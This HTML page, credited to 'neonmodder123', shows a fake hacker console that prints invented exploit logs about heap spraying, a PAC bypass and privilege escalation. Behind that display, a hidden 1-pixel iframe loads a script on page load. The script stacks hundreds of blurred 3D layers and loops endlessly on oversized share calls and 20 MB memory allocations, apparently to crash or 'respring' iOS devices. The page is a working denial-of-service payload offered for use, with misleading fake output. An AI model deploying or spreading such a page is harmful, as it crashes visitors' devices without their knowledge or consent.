<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Executing Exploit...</title>
    <style>
        body {
            background: #000;
            color: #00ff00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
        }

        .terminal-container {
            width: 90%;
            max-width: 600px;
            padding: 20px;
            border: 1px solid #333;
            background: rgba(10, 10, 10, 0.9);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }

        #console {
            min-height: 150px;
        }

        .line {
            margin-bottom: 8px;
            font-size: 14px;
            opacity: 0;
            animation: fadeIn 0.1s forwards;
        }

        @keyframes fadeIn { to { opacity: 1; } }

        .status { color: #fff; font-weight: bold; }
        .cursor {
            display: inline-block;
            width: 8px; height: 15px;
            background: #00ff00;
            animation: blink 0.8s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }

        .footer {
            margin-top: 30px; font-size: 10px; color: #444;
            border-top: 1px solid #222; padding-top: 10px;
        }

        #respring-iframe {
            position: fixed; top: 0; left: 0; width: 1px; height: 1px;
            border: none; opacity: 0.01; pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="terminal-container">
        <div id="console"></div>
        <div class="footer">
            © 2026 <span>neonmodder123</span> | Licensed under MIT
        </div>
    </div>

    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        const consoleEl = document.getElementById('console');
        
        // Список фейковых логов
        const logs = [
            "[INFO] Connection established with kernel...",
            "[OK] Checking system version: iOS 17/18 found.",
            "[INFO] Initializing memory heap spray...",
            "[INFO] Attempting PAC bypass...",
            "[OK] Success! Escalating privileges...",
            "[INFO] Mapping I/O surfaces...",
            "[WRN] WebKit thread saturation detected.",
            "[RUN] Launching final payload: respring_loop.js...",
            "READY IN 3... 2... 1..."
        ];

        let lineIndex = 0;

        function addLog() {
            if (lineIndex < logs.length) {
                const div = document.createElement('div');
                div.className = 'line';
                div.innerHTML = logs[lineIndex];
                consoleEl.appendChild(div);
                lineIndex++;
                
                // Скорость появления строк (каждые 600мс)
                setTimeout(addLog, 600); 
            } else {
                // Когда логи кончились, запускаем респринг
                startRespring();
            }
        }

        function startRespring() {
            const frame = document.getElementById('respring-iframe');
            // ТВОЙ ОРИГИНАЛЬНЫЙ КОД
            const respringScript = `
                <html>
                <body style="margin:0; overflow:hidden;">
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);

                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
                            container.appendChild(d);
                        }

                        setInterval(() => {
                            try {
                                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
                            } catch(e) {}
                            let x = new Uint8Array(1024 * 1024 * 20);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\/script>
                </body>
                </html>
            `;
            frame.srcdoc = respringScript;
        }

        // Запускаем печать логов при загрузке
        window.onload = addLog;
    </script>
</body>
</html>
